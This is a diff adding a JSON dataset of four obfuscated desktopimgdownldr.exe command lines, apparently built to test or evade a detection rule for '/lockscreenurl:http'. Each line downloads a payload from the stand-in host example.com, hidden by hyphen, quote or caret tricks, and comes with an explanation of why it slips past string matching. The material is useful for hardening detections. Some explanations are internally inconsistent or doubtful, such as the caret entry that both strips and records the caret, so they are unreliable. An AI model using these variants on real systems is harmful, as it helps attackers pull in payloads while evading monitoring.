@@ -1,0 +1,18 @@
+[
+  {
+    "output": "desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.png",
+    "explanation": "Substitution technique: Built-in Microsoft binaries leveraging standard Windows CLI parsing frameworks traditionally treat hyphens ('-') interchangeably with forward slashes ('/') as argument prefixes. Substituting '/lockscreenurl:' with '-lockscreenurl:' completely breaks the literal string detection 'CommandLine|contains: \'/lockscreenurl:http\'' while performing the exact same remote file download behavior."
+  },
+  {
+    "output": "desktopimgdownldr.exe \"/lockscreenurl\":http://example.com/payload.png",
+    "explanation": "Insertion technique: Enclosing the key portion of the parameter switch inside double quotes ('\"/lockscreenurl\"') interrupts the continuous substring sequence tracked by the rule. The native Windows argument tokenizer automatically unquotes and stitches parameters during execution initialization, passing the intact switch to the utility."
+  },
+  {
+    "output": "cmd.exe /c desktopimgdownldr.exe /locksc^reenurl:http://example.com/payload.png",
+    "explanation": "Insertion technique: Executing the utility within a cmd.exe environment permits the injection of a shell caret escape operator ('^') into the parameter switch name. The command interpreter strips this token out prior to process instantiation, recording a raw process creation string event of '/locksc^reenurl:' which successfully subverts static pattern detection."
+  },
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:h\"tt\"p://example.com/payload.png",
+    "explanation": "Insertion technique: Inserting an adjacent pair of double quotes directly into the protocol schema ('h\"tt\"p://') breaks up the strict linear substring match for '/lockscreenurl:http'. The binary's internal network handler unquotes and normalizes the target string precisely upon execution to initiate the remote connection successfully."
+  }
+]
